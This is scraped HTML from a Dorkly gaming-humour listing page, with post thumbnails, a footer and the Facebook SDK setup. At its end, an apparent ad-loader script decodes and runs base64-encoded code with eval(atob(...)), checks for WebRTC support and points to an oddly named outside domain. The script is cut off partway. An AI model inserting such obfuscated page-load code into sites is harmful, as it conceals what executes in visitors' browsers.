				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="12 D&amp;D Players Share Their Funniest In-Game Moments" data-src="http://0.media.dorkly.cvcdn.com/80/64/3a9634664c5e4b7f1d7bda8b09044c46.jpg" data-src-retina="http://0.media.dorkly.cvcdn.com/80/64/eb4343a6c17e2961c18022e5ed8b47c4.jpg">
				<noscript>
					<img src="http://0.media.dorkly.cvcdn.com/80/64/3a9634664c5e4b7f1d7bda8b09044c46.jpg" class="img-responsive" alt="12 D&amp;D Players Share Their Funniest In-Game Moments">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86113/funny-dungeons-and-dragons-dnd-true-stories-funniest-stories" data-ga-category="Listing" data-ga-label="12 D&D Players Share Their Funniest In-Game Moments (Node ID: 86113) [Title]">12 D&D Players Share Their Funniest In-Game Moments</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://0.media.dorkly.cvcdn.com/80/64/3a9634664c5e4b7f1d7bda8b09044c46.jpg", "name": "12 D&amp;D Players Share Their Funniest In-Game Moments"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-5 pod-post cf">
		<article data-node-id="86128">
			<a href="/post/86128/infinity-war-memes" class="thumb" data-ga-category="Listing" data-ga-label="20 Infinity War Memes That Will Probably Die in Infinity War (Node ID: 86128) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="20 Infinity War Memes That Will Probably Die in Infinity War" data-src="http://0.media.dorkly.cvcdn.com/98/76/fdfa549566e79462ccb5eaad20450352.jpg" data-src-retina="http://2.media.dorkly.cvcdn.com/98/76/7310f302d958fdcda60b9e22539f69f0.jpg">
				<noscript>
					<img src="http://0.media.dorkly.cvcdn.com/98/76/fdfa549566e79462ccb5eaad20450352.jpg" class="img-responsive" alt="20 Infinity War Memes That Will Probably Die in Infinity War">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86128/infinity-war-memes" data-ga-category="Listing" data-ga-label="20 Infinity War Memes That Will Probably Die in Infinity War (Node ID: 86128) [Title]">20 Infinity War Memes That Will Probably Die in Infinity War</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://0.media.dorkly.cvcdn.com/98/76/fdfa549566e79462ccb5eaad20450352.jpg", "name": "20 Infinity War Memes That Will Probably Die in Infinity War"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-6 pod-video cf">
		<article data-node-id="86121">
			<a href="/video/86121/what-really-happens-when-mario-destroys-castles" class="thumb" data-ga-category="Listing" data-ga-label="What Really Happens When Mario Destroys Castles (Node ID: 86121) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="What Really Happens When Mario Destroys Castles" data-src="http://2.media.dorkly.cvcdn.com/98/81/1b856ff0a098e8abc96aa52e3e807da6.jpg" data-src-retina="http://1.media.dorkly.cvcdn.com/98/81/ad40ca4d740e64809ac8b71633977692.jpg">
				<noscript>
					<img src="http://2.media.dorkly.cvcdn.com/98/81/1b856ff0a098e8abc96aa52e3e807da6.jpg" class="img-responsive" alt="What Really Happens When Mario Destroys Castles">
				</noscript>
									<span class="play-btn"><span class="caret"></span></span>
							</a>
			<div class="caption">
					<span class="badge is_series">Original</span>
				<h3 class="title"><a href="/video/86121/what-really-happens-when-mario-destroys-castles" data-ga-category="Listing" data-ga-label="What Really Happens When Mario Destroys Castles (Node ID: 86121) [Title]">What Really Happens When Mario Destroys Castles</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://2.media.dorkly.cvcdn.com/98/81/1b856ff0a098e8abc96aa52e3e807da6.jpg", "name": "What Really Happens When Mario Destroys Castles"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-7 pod-post cf">
		<article data-node-id="86118">
			<a href="/post/86118/avengers-infinity-war-trailer-2-twitter-reactions-memes" class="thumb" data-ga-category="Listing" data-ga-label="20 Brilliant Internet Reactions to the New Infinity War Trailer (Node ID: 86118) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="20 Brilliant Internet Reactions to the New Infinity War Trailer" data-src="http://0.media.dorkly.cvcdn.com/46/86/3bb95dfff2a98c55c6ded3d03bbe2032.jpg" data-src-retina="http://0.media.dorkly.cvcdn.com/46/86/a6660d0505fca8547c384f1803596213.jpg">
				<noscript>
					<img src="http://0.media.dorkly.cvcdn.com/46/86/3bb95dfff2a98c55c6ded3d03bbe2032.jpg" class="img-responsive" alt="20 Brilliant Internet Reactions to the New Infinity War Trailer">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86118/avengers-infinity-war-trailer-2-twitter-reactions-memes" data-ga-category="Listing" data-ga-label="20 Brilliant Internet Reactions to the New Infinity War Trailer (Node ID: 86118) [Title]">20 Brilliant Internet Reactions to the New Infinity War Trailer</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://0.media.dorkly.cvcdn.com/46/86/3bb95dfff2a98c55c6ded3d03bbe2032.jpg", "name": "20 Brilliant Internet Reactions to the New Infinity War Trailer"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-8 pod-post cf">
		<article data-node-id="86107">
			<a href="/post/86107/pokemon-sun-playthrough-episode-79" class="thumb" data-ga-category="Listing" data-ga-label="Pokemon Sun Playthrough - Episode 79 (Node ID: 86107) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="Pokemon Sun Playthrough - Episode 79" data-src="http://1.media.dorkly.cvcdn.com/10/26/64aff25ae511c56163e8144d5b18b439.jpg" data-src-retina="http://1.media.dorkly.cvcdn.com/10/26/b3184e2a1e42d01171e0a4b8b9f67325.jpg">
				<noscript>
					<img src="http://1.media.dorkly.cvcdn.com/10/26/64aff25ae511c56163e8144d5b18b439.jpg" class="img-responsive" alt="Pokemon Sun Playthrough - Episode 79">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86107/pokemon-sun-playthrough-episode-79" data-ga-category="Listing" data-ga-label="Pokemon Sun Playthrough - Episode 79 (Node ID: 86107) [Title]">Pokemon Sun Playthrough - Episode 79</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://1.media.dorkly.cvcdn.com/10/26/64aff25ae511c56163e8144d5b18b439.jpg", "name": "Pokemon Sun Playthrough - Episode 79"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-9 pod-post cf">
		<article data-node-id="86019">
			<a href="/post/86019/marvel-superhero-for-all-50-states-official" class="thumb" data-ga-category="Listing" data-ga-label="We Pick the Official Marvel Superhero For All 50 States (Node ID: 86019) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="We Pick the Official Marvel Superhero For All 50 States" data-src="http://1.media.dorkly.cvcdn.com/94/99/e01392301e484987cfd0c7eb7e09acfb.jpg" data-src-retina="http://0.media.dorkly.cvcdn.com/94/99/bf7b1e44639fc410f8db228554c84a88.jpg">
				<noscript>
					<img src="http://1.media.dorkly.cvcdn.com/94/99/e01392301e484987cfd0c7eb7e09acfb.jpg" class="img-responsive" alt="We Pick the Official Marvel Superhero For All 50 States">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86019/marvel-superhero-for-all-50-states-official" data-ga-category="Listing" data-ga-label="We Pick the Official Marvel Superhero For All 50 States (Node ID: 86019) [Title]">We Pick the Official Marvel Superhero For All 50 States</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://1.media.dorkly.cvcdn.com/94/99/e01392301e484987cfd0c7eb7e09acfb.jpg", "name": "We Pick the Official Marvel Superhero For All 50 States"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-10 pod-post cf">
		<article data-node-id="86112">
			<a href="/post/86112/15-incredibly-satisfying-gaming-experiences" class="thumb" data-ga-category="Listing" data-ga-label="15 Incredibly Satisfying Gaming Experiences (Node ID: 86112) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="15 Incredibly Satisfying Gaming Experiences" data-src="http://2.media.dorkly.cvcdn.com/23/59/100d14a8a84bbe0ce0e3689d94105a55-15-incredibly-satisfying-gaming-experiences.jpg" data-src-retina="http://0.media.dorkly.cvcdn.com/23/59/d65cb5e733aa7456673a273bca4b7c31-15-incredibly-satisfying-gaming-experiences.jpg">
				<noscript>
					<img src="http://2.media.dorkly.cvcdn.com/23/59/100d14a8a84bbe0ce0e3689d94105a55-15-incredibly-satisfying-gaming-experiences.jpg" class="img-responsive" alt="15 Incredibly Satisfying Gaming Experiences">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86112/15-incredibly-satisfying-gaming-experiences" data-ga-category="Listing" data-ga-label="15 Incredibly Satisfying Gaming Experiences (Node ID: 86112) [Title]">15 Incredibly Satisfying Gaming Experiences</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://2.media.dorkly.cvcdn.com/23/59/100d14a8a84bbe0ce0e3689d94105a55-15-incredibly-satisfying-gaming-experiences.jpg", "name": "15 Incredibly Satisfying Gaming Experiences"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-11 pod-post cf">
		<article data-node-id="86117">
			<a href="/post/86117/a-tumblr-user-calculated-luigis-official-penis-length" class="thumb" data-ga-category="Listing" data-ga-label="A Tumblr User Calculated Luigi's Official...Length (Node ID: 86117) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="A Tumblr User Calculated Luigi&#039;s Official...Length" data-src="http://1.media.dorkly.cvcdn.com/93/89/9d3fbddfc8f2cf1518713ea3c778391a.jpg" data-src-retina="http://1.media.dorkly.cvcdn.com/93/89/22714b3fb13cf994b7aff58c34cc53c8.jpg">
				<noscript>
					<img src="http://1.media.dorkly.cvcdn.com/93/89/9d3fbddfc8f2cf1518713ea3c778391a.jpg" class="img-responsive" alt="A Tumblr User Calculated Luigi&#039;s Official...Length">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86117/a-tumblr-user-calculated-luigis-official-penis-length" data-ga-category="Listing" data-ga-label="A Tumblr User Calculated Luigi's Official...Length (Node ID: 86117) [Title]">A Tumblr User Calculated Luigi's Official...Length</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://1.media.dorkly.cvcdn.com/93/89/9d3fbddfc8f2cf1518713ea3c778391a.jpg", "name": "A Tumblr User Calculated Luigi&#039;s Official...Length"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-12 pod-post cf">
		<article data-node-id="86111">
			<a href="/post/86111/drake-plays-fortnite-on-twitch-with-ninja-twitter-reactions-memes" class="thumb" data-ga-category="Listing" data-ga-label="20 Perfect Internet Reactions to Drake Streaming Fortnite on Twitch (Node ID: 86111) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="20 Perfect Internet Reactions to Drake Streaming Fortnite on Twitch" data-src="http://1.media.dorkly.cvcdn.com/38/48/473e081686f6013cc4e0edc117950f06.jpg" data-src-retina="http://1.media.dorkly.cvcdn.com/38/48/764de6eb17739fd510ea39c84291a99e.jpg">
				<noscript>
					<img src="http://1.media.dorkly.cvcdn.com/38/48/473e081686f6013cc4e0edc117950f06.jpg" class="img-responsive" alt="20 Perfect Internet Reactions to Drake Streaming Fortnite on Twitch">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86111/drake-plays-fortnite-on-twitch-with-ninja-twitter-reactions-memes" data-ga-category="Listing" data-ga-label="20 Perfect Internet Reactions to Drake Streaming Fortnite on Twitch (Node ID: 86111) [Title]">20 Perfect Internet Reactions to Drake Streaming Fortnite on Twitch</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://1.media.dorkly.cvcdn.com/38/48/473e081686f6013cc4e0edc117950f06.jpg", "name": "20 Perfect Internet Reactions to Drake Streaming Fortnite on Twitch"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-13 pod-post cf">
		<article data-node-id="86082">
			<a href="/post/86082/why-ready-player-one-will-be-spielbergs-worst-movie-in-20-years-prediction" class="thumb" data-ga-category="Listing" data-ga-label="I Bet 'Ready Player One' Would Be Terrible And I Already Lost (Node ID: 86082) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="I Bet &#039;Ready Player One&#039; Would Be Terrible And I Already Lost" data-src="http://0.media.dorkly.cvcdn.com/69/20/1908470965f0a3d44ec16e17bc89c42d.jpg" data-src-retina="http://0.media.dorkly.cvcdn.com/69/20/2f421117cef1225df9fe0168407d1ad0.jpg">
				<noscript>
					<img src="http://0.media.dorkly.cvcdn.com/69/20/1908470965f0a3d44ec16e17bc89c42d.jpg" class="img-responsive" alt="I Bet &#039;Ready Player One&#039; Would Be Terrible And I Already Lost">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86082/why-ready-player-one-will-be-spielbergs-worst-movie-in-20-years-prediction" data-ga-category="Listing" data-ga-label="I Bet 'Ready Player One' Would Be Terrible And I Already Lost (Node ID: 86082) [Title]">I Bet 'Ready Player One' Would Be Terrible And I Already Lost</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://0.media.dorkly.cvcdn.com/69/20/1908470965f0a3d44ec16e17bc89c42d.jpg", "name": "I Bet &#039;Ready Player One&#039; Would Be Terrible And I Already Lost"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-14 pod-post cf">
		<article data-node-id="86028">
			<a href="/post/86028/a-fallout-subquest-6-when-you-have-to-give-your-sidekick-a-weapon" class="thumb" data-ga-category="Listing" data-ga-label="A Fallout Subquest 6: When You Have to Give Your Sidekick a Weapon (Node ID: 86028) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="A Fallout Subquest 6: When You Have to Give Your Sidekick a Weapon" data-src="http://1.media.dorkly.cvcdn.com/40/95/991a68d9ae684d7a7d13c8f1c2448e09.jpg" data-src-retina="http://0.media.dorkly.cvcdn.com/40/95/3cc3f740ebc9944e0767859056e19727.jpg">
				<noscript>
					<img src="http://1.media.dorkly.cvcdn.com/40/95/991a68d9ae684d7a7d13c8f1c2448e09.jpg" class="img-responsive" alt="A Fallout Subquest 6: When You Have to Give Your Sidekick a Weapon">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86028/a-fallout-subquest-6-when-you-have-to-give-your-sidekick-a-weapon" data-ga-category="Listing" data-ga-label="A Fallout Subquest 6: When You Have to Give Your Sidekick a Weapon (Node ID: 86028) [Title]">A Fallout Subquest 6: When You Have to Give Your Sidekick a Weapon</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://1.media.dorkly.cvcdn.com/40/95/991a68d9ae684d7a7d13c8f1c2448e09.jpg", "name": "A Fallout Subquest 6: When You Have to Give Your Sidekick a Weapon"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-15 pod-post cf">
		<article data-node-id="86076">
			<a href="/post/86076/the-25-best-anime-tumblr-posts-of-all-time" class="thumb" data-ga-category="Listing" data-ga-label="The 25 Best Anime Tumblr Posts of All-Time (Node ID: 86076) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="The 25 Best Anime Tumblr Posts of All-Time" data-src="http://1.media.dorkly.cvcdn.com/58/51/9bb1c8ed6fbbd09e6dda2323ae7824f0.jpg" data-src-retina="http://0.media.dorkly.cvcdn.com/58/51/295d8d952317595229811cba5aad7b31.jpg">
				<noscript>
					<img src="http://1.media.dorkly.cvcdn.com/58/51/9bb1c8ed6fbbd09e6dda2323ae7824f0.jpg" class="img-responsive" alt="The 25 Best Anime Tumblr Posts of All-Time">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86076/the-25-best-anime-tumblr-posts-of-all-time" data-ga-category="Listing" data-ga-label="The 25 Best Anime Tumblr Posts of All-Time (Node ID: 86076) [Title]">The 25 Best Anime Tumblr Posts of All-Time</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://1.media.dorkly.cvcdn.com/58/51/9bb1c8ed6fbbd09e6dda2323ae7824f0.jpg", "name": "The 25 Best Anime Tumblr Posts of All-Time"}</script>
		</article>
	</div>
</div>									</div>
        	</div>
<p class="text-muted hide">Nothing found...</p>

	<script type="text/x-handlebars-template" id="template-pod">
		{{#each items}}
			<div class="col-sm-6 col-md-4">
				<div class="pod pod-post pod-large {{cssClasses}} cf">
					<article>
						{{#if ad}}
							{{{ad}}}
						{{else}}
							<a href="{{url}}" class="thumb">
								<img src="{{thumb}}" width="300" height="170" alt="{{alt_text}}" class="img-responsive">
								{{#isVideo media_type}}
									<span class="play-btn"><span class="caret"></span></span>
								{{/isVideo}}
							</a>
							<div class="caption">
								{{#if is_original}}
									<span class="badge">Original</span>
								{{/if}}
								<h3><a href="{{url}}">{{{title}}}</a></h3>
							</div>
						{{/if}}
					</article>
				</div>
			</div>
		{{/each}}
		<div class="hide"><iframe src="/jument/ads/dfp.html?zone=%2F8422%2Fdorkly.com%2Fhomepage&amp;size=%5B%5B1%2C2%5D%5D&amp;targeting%5Brating%5D=unrated" width="0" height="0" class="ad-iframe"></iframe></div>
	</script>
</div>
                </div>
                                    <!-- Facebook like box -->
                    <div class="hiding" id="like-box">
                        <div class="title-like-box" >We like you. Do you like us too?</div>
                        <div class="fb-like-box" data-href="http://www.facebook.com/dorkly" data-colorscheme="light" data-show-faces="true" data-header="false" data-stream="false" data-show-border="false"></div>
                        <br>
                        <div class="no-show"><a href="#">Don't ask me again.</a></div>
                    </div>
                            </div>
    </div>
    <footer class="site-footer">
	<div class="container cf">
		<div class="row">
			<div class="col-xs-12 col-sm-12 col-md-12">
				<ul class="footer-links ga-feature-usage col-xs-12 hidden-sm col-md-2" data-ga-feature="Footer Links" data-ga-category="Footer" data-ga-label="Footer Links">
											<li><a href="/about" data-ga-category="Footer" data-ga-label="Footer Links: About">About</a></li>
											<li><a href="/privacy" data-ga-category="Footer" data-ga-label="Footer Links: Privacy Policy">Privacy Policy</a></li>
											<li><a href="/terms" data-ga-category="Footer" data-ga-label="Footer Links: Terms & Conditions">Terms & Conditions</a></li>
											<li><a href="/contact" data-ga-category="Footer" data-ga-label="Footer Links: Contact">Contact</a></li>
									</ul>
				<ul class="footer-links split ga-feature-usage col-xs-12 hidden-sm col-md-2" data-ga-feature="Footer Links" data-ga-category="Footer" data-ga-label="Footer Links">
											<li><a href="/sitemap" data-ga-category="Footer" data-ga-label="Footer Links: Sitemap">Sitemap</a></li>
											<li><a href="/sitemap/index" data-ga-category="Footer" data-ga-label="Footer Links: Index">Index</a></li>
											<li><a href="mailto:ads@collegehumor.com" data-ga-category="Footer" data-ga-label="Footer Links: Advertise">Advertise</a></li>
											<li><a href="http://iac.com/careers/job-listings" data-ga-category="Footer" data-ga-label="Footer Links: Jobs">Jobs</a></li>
											<li><a href="http://www.collegehumor.com/" data-ga-category="Footer" data-ga-label="Footer Links: CollegeHumor">CollegeHumor</a></li>
									</ul>
				<ul class="footer-links ga-feature-usage hidden-xs col-sm-3 hidden-md hidden-lg" data-ga-feature="Footer Links" data-ga-category="Footer" data-ga-label="Footer Links">
											<li><a href="/about" data-ga-category="Footer" data-ga-label="Footer Links: About">About</a></li>
											<li><a href="/privacy" data-ga-category="Footer" data-ga-label="Footer Links: Privacy Policy">Privacy Policy</a></li>
											<li><a href="/terms" data-ga-category="Footer" data-ga-label="Footer Links: Terms & Conditions">Terms & Conditions</a></li>
											<li><a href="/contact" data-ga-category="Footer" data-ga-label="Footer Links: Contact">Contact</a></li>
																<li><a href="/sitemap" data-ga-category="Footer" data-ga-label="Footer Links: Sitemap">Sitemap</a></li>
											<li><a href="/sitemap/index" data-ga-category="Footer" data-ga-label="Footer Links: Index">Index</a></li>
											<li><a href="mailto:ads@collegehumor.com" data-ga-category="Footer" data-ga-label="Footer Links: Advertise">Advertise</a></li>
											<li><a href="http://iac.com/careers/job-listings" data-ga-category="Footer" data-ga-label="Footer Links: Jobs">Jobs</a></li>
											<li><a href="http://www.collegehumor.com/" data-ga-category="Footer" data-ga-label="Footer Links: CollegeHumor">CollegeHumor</a></li>
									</ul>
				<div class="col-xs-12 hidden-sm col-md-2">
					<ul class="social-links ga-feature-usage" data-ga-feature="Footer Social Links" data-ga-category="Footer" data-ga-label="Social">
						<li>Follow</li>
											<li><a href="http://www.facebook.com/Dorkly" target="_blank" data-ga-category="Footer" data-ga-label="Social: Facebook"><span class="icon-facebook"></span><span class="network-name">Facebook</span></a></li>
											<li><a href="https://twitter.com/dorkly" target="_blank" data-ga-category="Footer" data-ga-label="Social: Twitter"><span class="icon-twitter"></span><span class="network-name">Twitter</span></a></li>
											<li><a href="http://dorkly.tumblr.com/" target="_blank" data-ga-category="Footer" data-ga-label="Social: Tumblr"><span class="icon-tumblr"></span><span class="network-name">Tumblr</span></a></li>
											<li><a href="https://www.youtube.com/user/dorkly?sub_confirmation=1" target="_blank" data-ga-category="Footer" data-ga-label="Social: YouTube"><span class="icon-youtube"></span><span class="network-name">YouTube</span></a></li>
										</ul>
				</div>
				<div class="hidden-xs col-sm-3 hidden-md hidden-lg">
					<ul class="social-links ga-feature-usage" data-ga-feature="Footer Social Links" data-ga-category="Footer" data-ga-label="Social">
						<li>Follow</li>
											<li><a href="http://www.facebook.com/Dorkly" target="_blank" data-ga-category="Footer" data-ga-label="Social: Facebook"><span class="icon-facebook"></span><span class="network-name">Facebook</span></a></li>
											<li><a href="https://twitter.com/dorkly" target="_blank" data-ga-category="Footer" data-ga-label="Social: Twitter"><span class="icon-twitter"></span><span class="network-name">Twitter</span></a></li>
											<li><a href="http://dorkly.tumblr.com/" target="_blank" data-ga-category="Footer" data-ga-label="Social: Tumblr"><span class="icon-tumblr"></span><span class="network-name">Tumblr</span></a></li>
											<li><a href="https://www.youtube.com/user/dorkly?sub_confirmation=1" target="_blank" data-ga-category="Footer" data-ga-label="Social: YouTube"><span class="icon-youtube"></span><span class="network-name">YouTube</span></a></li>
										</ul>
				</div>
				<div class="col-xs-12 col-sm-3 col-md-2">
					<div id="newsletter">
						<div class="nav-subscribe">
							<a href="https://www.dorkly.com/static/newsletter" class="nav-newsletter"><span class="nav-label">Subscribe</span></a>
						</div>
					</div>
				</div>
				<div class="col-xs-12 hidden-sm col-md-2">
				</div>
				<div class="col-xs-12 col-sm-3 col-md-2">
					<div class="site-logo"></div>
					<div class="site-copyright cf">CHMEDIA ©2018 Connected Ventures, LLC. All Rights Reserved.</div>
					<div class="top-block">
						<a href="#" class="scroll-to back-to-top ga-feature-usage ga-interaction ga-interaction-click-only" data-ga-feature="Scroll Top" data-ga-category="Footer" data-ga-label="Back to Top">Top of Page</a>
					</div>
				</div>
			</div>
		</div>
	</div>
</footer>
    <script type="text/javascript" defer src="http://1.static.dorkly.cvcdn.com/js/packages/8b9dddcad4333c9197441f12d60c45da.js"></script>
    
    
            <div id="fb-root"></div>
<script>
	// setting facebook comment to take the width of the browser when we are on small device
	$( document ).ready(function() {
		var $browser_width = $( window ).width();
		if($browser_width >= 600){
			$browser_width = 600;
		}
		$('.fb-comments').attr('data-width',$browser_width - 30);
	});

	window.fbAsyncInit = function() {
		FB.init({
			appId: 541562735997202,
			version: 'v2.7',
			status: true,
			cookie: true,
			oauth : true,
			xfbml: true
		});
		$('body').trigger('fbinit');
	};
	(function(d, s, id) {
		var js, fjs = d.getElementsByTagName(s)[0];
		if (d.getElementById(id)) return;
		js = d.createElement(s); js.id = id;
		js.src = "//connect.facebook.com/en_US/sdk.js";
		fjs.parentNode.insertBefore(js, fjs);
	}(document, 'script', 'facebook-jssdk'));
</script>    
	    <div class="ad-adhesive-footer-wrapper">
        <div id="ad-adhesive-footer"><script type="text/javascript">if(typeof(googletag) != "undefined") { googletag.cmd.push(function() { googletag.display("ad-adhesive-footer"); }); }</script></div>    </div>
	
        <script>
      var adonis = adonis || {};
      adonis.conditionalAdRendering = true;
      adonis.scriptResources = ["prebid.js"];
      adonis.transport = 'https://9k6y.b2rrns9dgbx56tf5kc.agency/http';
    </script>
    <!-- Adonis loader.min.js --><script>/* loader-7.0.2 */eval(atob("IWZ1bmN0aW9uIGUodCxuLHIpe2Z1bmN0aW9uIG8oYSxjKXtpZighblthXSl7aWYoIXRbYV0pe3ZhciB1PSJmdW5jdGlvbiI9PXR5cGVvZiByZXF1aXJlJiZyZXF1aXJlO2lmKCFjJiZ1KXJldHVybiB1KGEsITApO2lmKGkpcmV0dXJuIGkoYSwhMCk7dmFyIHM9bmV3IEVycm9yKCJDYW5ub3QgZmluZCBtb2R1bGUgJyIrYSsiJyIpO3Rocm93IHMuY29kZT0iTU9EVUxFX05PVF9GT1VORCIsc312YXIgbD1uW2FdPXtleHBvcnRzOnt9fTt0W2FdWzBdLmNhbGwobC5leHBvcnRzLGZ1bmN0aW9uKGUpe3ZhciBuPXRbYV1bMV1bZV07cmV0dXJuIG8obj9uOmUpfSxsLGwuZXhwb3J0cyxlLHQsbixyKX1yZXR1cm4gblthXS5leHBvcnRzfWZvcih2YXIgaT0iZnVuY3Rpb24iPT10eXBlb2YgcmVxdWlyZSYmcmVxdWlyZSxhPTA7YTxyLmxlbmd0aDthKyspbyhyW2FdKTtyZXR1cm4gb30oezE6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dmFyIHI9ZSgxMiksbz1lKDcpO2UoMjIpLHdpbmRvdy5hZG9uaXNDb25uVHlwZT0iaHR0cCIsci5sb2dnZXIuaW5mbygiW2h0dHBMb2FkZXJdOiBTdGFydGluZyBib290c3RyYXAiKSwoMCxvLnJ1bikoKX0sezEyOjEyLDIyOjIyLDc6N31dLDI6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcigpe3JldHVybiBpKHdpbmRvdykmJmMod2luZG93KSYmdSh3aW5kb3cpJiZhKHdpbmRvdykmJnMod2luZG93KX1mdW5jdGlvbiBvKCl7cmV0dXJuIGkod2luZG93KSYmdSh3aW5kb3cpJiZhKHdpbmRvdykmJnMod2luZG93KX1mdW5jdGlvbiBpKGUpe3ZhciB0PSJfX3h5el9fIjt0cnl7cmV0dXJuIGUubG9jYWxTdG9yYWdlLnNldEl0ZW0odCx0KSxlLmxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKHQpLCEwfWNhdGNoKG4pe3JldHVybiExfX1mdW5jdGlvbiBhKGUpe3RyeXtyZXR1cm4hIW5ldyBlLkJsb2J9Y2F0Y2godCl7cmV0dXJuITF9fWZ1bmN0aW9uIGMoZSl7dmFyIHQ9ZnVuY3Rpb24odCl7cmV0dXJuIHQuc29tZShmdW5jdGlvbih0KXtyZXR1cm4gdCBpbiBlfSl9LG49WyJSVENQZWVyQ29ubmVjdGlvbiIsIm1velJUQ1BlZXJDb25uZWN0aW9uIiwid2Via2l0UlRDUGVlckNvbm5lY3Rpb24iXSxyPVsiUlRDU2Vzc2lvbkRlc2NyaXB0aW9uIiwibW96UlRDU2Vzc2lvbkRlc2NyaXB0aW9uIiwid2Via2l0UlRDU2Vzc2lvbkRlc2NyaXB0aW9uIl0sbz1bIlJUQ0ljZUNhbmRpZGF0ZSIsIm1velJUQ0ljZUNhbmRpZGF0ZSIsIndlYmtpdFJUQ0ljZUNhbmRpZGF0ZSJdO3JldHVybiB0KG4pJiZ0KHIpJiZ0KG8pfWZ1bmN0aW9uIHUoZSl7cmV0dXJuIlByb21pc2UiaW4gZSYmInJlc29sdmUiaW4gZS5Qcm9taXNlJiYicmVqZWN0ImluIGUuUHJvbWlzZSYmImFsbCJpbiBlLlByb21pc2UmJiJyYWNlImluIGUuUHJvbWlzZX1mdW5jdGlvbiBzKGUpe3JldHVybiJmdW5jdGlvbiI9PXR5cGVvZiBlLk9iamVjdC5hc3NpZ259dC5leHBvcnRzPXtpc1N1cHBvcnRlZEJyb3dzZXJSdGM6cixpc1N1cHBvcnRlZEJyb3dzZXI6byxpc0xvY2FsU3RvcmFnZVN1cHBvcnRlZDppLGlzUnRjU3VwcG9ydGVkOmMsaXNCbG9iU3VwcG9ydGVkOmEsaXNPYmplY3RBc3NpZ25TdXBwb3J0ZWQ6cyxpc1Byb21pc2VTdXBwb3J0ZWQ6dX19LHt9XSwzOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9u